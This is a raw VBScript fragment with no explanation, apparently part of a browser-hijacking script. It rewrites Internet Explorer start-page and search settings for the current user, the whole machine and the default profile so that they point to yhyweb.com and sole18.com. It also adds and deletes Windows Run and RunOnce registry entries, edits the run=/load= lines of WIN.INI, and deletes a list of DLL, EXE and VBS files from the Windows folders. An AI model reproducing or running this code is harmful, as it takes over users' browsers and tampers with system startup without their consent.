   Set WHl = CreateObject("WScript.Shell")
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\system","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\internat.exe","internat.exe"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\zwupdows","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qwe","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\win","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\win1","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\mwin","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\internt","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\intenet","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Inernet","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Internet","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\iexpleror","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\zxdows","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Start Pagewin","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Start Page","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\syste","12"
   WHl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\my","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\SystemServices","12"
   WHl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\stup","12"
   WHl.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\zwupdows"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qwe"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\win"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\win1"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\mwin"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\internt"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\intenet"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\inernet"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Internet"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\iexpleror"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\zxdows"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Start Pagewin"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Start Page"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\syste"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\system"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\SystemServices"
   WHl.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\stup"
   WHl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\", ""
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page", "http://www.sole18.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://www.sole18.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Default_Search_URL", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Bar", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\SearchURL", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\SearchURL", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Search\SearchAssistant", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Search\SearchAssistant", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\First Home Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Window Title", "Internet Explorer"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Search Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Search Bar", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Local Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Page_URL", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\First Home Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\Local Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Local Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "Internet Explorer"
   WHl.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\SearchURL", "http://www.yhyweb.com"
   WHl.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.yhyweb.com"
   WHl.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main\Default_Search_URL", "http://www.yhyweb.com"
   WHl.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Main\Search Bar", "http://www.yhyweb.com"
   WHl.RegWrite "HKEY_USERS\.Default\Software\Microsoft\Internet Explorer\Search\SearchAssistant", "http://www.yhyweb.com"

   Set FSO = CreateObject("Scripting.FileSystemObject")
   myfile14=FSO.FileExists("c:\windows\WIN.INI")
   if myfile14 then
   set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
   mywin=FSO2.ReadALL()
   l=Instr(mywin,"run=")-3
   m=Instr(mywin,"load=")-1
   n=Instr(mywin,"NullPort=")-3
   FSO2.close
   if l>0 and m>0 and l>m then
   set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
   mywin2=FSO3.Read(l)
   FSO3.close
   set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
   mywin3=FSO4.Read(m)
   FSO4.close
   if n>0 and n>l then
   set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
   mywin4=FSO5.Read(n)
   FSO5.close
   mywin=Replace(mywin,mywin4,"")
   set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
   FSO2.Write mywin3
   FSO2.WriteLine "load="
   FSO2.Write "run="
   FSO2.Write mywin
   FSO2.close
   else
   mywin=Replace(mywin,mywin2,"")
   set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
   FSO2.Write mywin3
   FSO2.Write "load="
   FSO2.Write mywin
   FSO2.close
   end if
   end if
   end if

   myfile=FSO.FileExists("c:\windows\win.dll")
   if myfile then FSO.DeleteFile("c:\windows\win.dll")

   myfile1=FSO.FileExists("c:\windows\mwin.dll")
   if myfile1 then FSO.DeleteFile("c:\windows\mwin.dll")

   myfile2=FSO.FileExists("c:\windows\mwin.exe")
   if myfile2 then FSO.DeleteFile("c:\windows\mwin.exe")

   myfile3=FSO.FileExists("c:\windows\mywin.exe")
   if myfile3 then FSO.DeleteFile("c:\windows\mywin.exe")

   myfile4=FSO.FileExists("c:\windows\Internet.dll")
   if myfile4 then FSO.DeleteFile("c:\windows\Internet.dll")

   myfile5=FSO.FileExists("c:\windows\Internet.exe")
   if myfile5 then FSO.DeleteFile("c:\windows\Internet.exe")

   myfile10=FSO.FileExists("c:\windows\system\Internet.dll")
   if myfile10 then FSO.DeleteFile("c:\windows\system\Internet.dll")

   myfile11=FSO.FileExists("c:\windows\system\Internet.exe")
   if myfile11 then FSO.DeleteFile("c:\windows\system\Internet.exe")

   myfile12=FSO.FileExists("c:\windows\system\Internet.exe")
   if myfile12 then FSO.DeleteFile("c:\windows\system\intenet.dll")

   myfile6=FSO.FileExists("c:\windows\system\zwupdows.dll")
   if myfile6 then FSO.DeleteFile("c:\windows\system\zwupdows.dll")

   myfile7=FSO.FileExists("c:\windows\system\zxdows.dll")
   if myfile7 then FSO.DeleteFile("c:\windows\system\zxdows.dll")

   myfile14=FSO.FileExists("c:\windows\system\zxdoms.dll")
   if myfile14 then FSO.DeleteFile("c:\windows\system\zxdoms.dll")

   myfile15=FSO.FileExists("c:\windows\system\system.dll")
   if myfile15 then FSO.DeleteFile("c:\windows\system\system.dll")

   myfile17=FSO.FileExists("c:\windows\system\syste.dll")
   if myfile17 then FSO.DeleteFile("c:\windows\system\syste.dll")

   myfile23=FSO.FileExists("c:\windows\system.dll")
   if myfile23 then FSO.DeleteFile("c:\windows\system.dll")

   myfile8=FSO.FileExists("c:\windows\windows.vbs")
   if myfile8 then FSO.DeleteFile("c:\windows\windows.vbs")

   myfile16=FSO.FileExists("c:\windows\SystemServices.vbs")
   if myfile16 then FSO.DeleteFile("c:\windows\SystemServices.vbs")

   myfile13=FSO.FileExists("c:\windows\stup.vbs")
   if myfile13 then FSO.DeleteFile("c:\windows\stup.vbs")

   myfile13=FSO.FileExists("c:\windows\unstup.vbs")
   if myfile13 then FSO.DeleteFile("c:\windows\unstup.vbs")
